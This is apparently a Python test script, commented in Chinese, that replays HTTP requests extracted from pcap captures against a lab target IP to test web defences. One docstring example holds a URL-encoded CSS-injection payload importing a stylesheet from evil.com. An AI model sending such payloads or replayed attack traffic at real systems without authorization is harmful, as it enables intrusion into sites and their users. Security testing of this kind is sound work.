#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
"""
2017.01.02 开始自动化测试模块
"""
try:
    import simplejson as json
except ImportError:
    import json

import requests
from pcap_scapy_parse import PcapParser

__author__ = '__L1n__w@tch'


class AutoTester:
    def __init__(self, result_json_file_path):
        """
        :param result_json_file_path: 解析 pcap 包得到的 json 格式文件
        """
        self.test_json_file = result_json_file_path

    def get_http_headers_dict(self):
        """
        从 json 文件中读取每一个 http 头放到字典中
        :return: dict(), 每一个元素是一个 http 头及其 pcap 包
        """
        with open(self.test_json_file, "r") as f:
            data_dict = json.load(f)

        return data_dict

    def get_http_headers_list(self):
        """
        从 json 文件中读取每一个 http 头放到列表中
        :return: list(), 每一个元素是一个 http 头
        """
        with open(self.test_json_file, "r") as f:
            data_dict = json.load(f)

        result_list = list()

        for each_pcap, each_pcap_https in data_dict.items():
            for each_http in each_pcap_https:
                result_list.append(each_http)

        return result_list

    @staticmethod
    def parse_http_header(http_header):
        """
        解析 http 头, 拿到 url 以及 http 头其他参数
        :return: (url, http_header), 提供给 requests 作为封装使用
        """
        url = PcapParser.get_url_from_raw_data(http_header)
        http_parameter = dict()

        for each_parameter in str(http_header).split("\r\n"):
            item = each_parameter.split(":", 1)
            # 正常的 http 头字段
            if len(item) == 2:
                key, value = item[0], item[1]
                http_parameter[key] = value.strip()
            # 不是 http 头字段, 忽视
            else:
                continue

        return url, http_parameter

    @staticmethod
    def get_post_data_from_http_header(http_header):
        """
        从 http 头获取 post 数据
        :param http_header: str(), "POST /simple.php HTTP/1.1\r\nHost: 10.0.1.70\r\nConnection: keep-alive\r\nContent-Length: 113\r\nCache-Control: max-age=0\r\nOrigin: http://10.0.1.70\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nReferer: http://10.0.1.70/simple.php\r\nAccept-Encoding: gzip,deflate,sdch\r\nAccept-Language: zh-CN,zh;q=0.8\r\nAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3\r\n\r\ninput=%3CSTYLE%3E%40%5C0069mport+%27http%3A%2F%2Fevil.com%2Fevil.css%27%3C%2FSTYLE%3E++&%CC%E1%BD%BB=%CC%E1%BD%BB"
        :return: str(), input=%3CSTYLE%3E%40%5C0069mport+%27http%3A%2F%2Fevil.com%2Fevil.css%27%3C%2FSTYLE%3E++&%CC%E1%BD%BB=%CC%E1%BD%BB
        """
        post_data = http_header.split("\r\n\r\n", 1)[1]
        return post_data

    def send_post_request(self, http_header, ip):
        """
        发送 POST 请求
        :param http_header: 要发送的 post 请求头
        :param ip: 目标 IP
        """
        url, header = self.parse_http_header(http_header)
        post_data = self.get_post_data_from_http_header(http_header)
        attack_url = "http://{}{}".format(ip, url)

        print("{sep}POST 攻击: {0}".format(attack_url, sep=" " * 4))
        print("{sep}POST 数据: {0}".format(post_data, sep=" " * 8))

        response = requests.post(attack_url, headers=header, data=post_data)
        input("决定好了就开始下一个")

    def send_get_request(self, http_header, ip):
        """
        发送 GET 请求
        :param http_header: 要发送的 get 请求头
        :param ip: 目标 IP
        """
        url, header = self.parse_http_header(http_header)
        attack_url = "http://{}{}".format(ip, url)
        print("    GET 攻击: {}".format(attack_url))

        response = requests.get(attack_url, headers=header)

    def create_http_request(self, ip):
        """
        :param ip: 目标 IP, 构造请求时使用
        """
        http_headers_dict = self.get_http_headers_dict()

        # 提取每一个 HTTP 头
        for each_pcap, each_pcap_https in http_headers_dict.items():
            print("测试: {}".format(each_pcap))
            for each_http in each_pcap_https:
                # POST 请求
                if PcapParser.is_http_post_request_header(each_http):
                    self.send_post_request(each_http, ip)
                # GET 请求
                elif PcapParser.is_http_get_request_header(each_http):
                    continue
                    self.send_get_request(each_http, ip)
                else:
                    raise RuntimeError("遇到无法解析的 HTTP 头了")

    def run(self, target_ip):
        """
        完成自动化测试流程
        :param target_ip: 测试服务器的 IP 地址
        """
        # 解析 HTTP 请求头, 按照 requests 库封装好并发送出去
        self.create_http_request(target_ip)


if __name__ == "__main__":
    at = AutoTester("2th_headers_result.json")
    at.run("192.168.116.2")
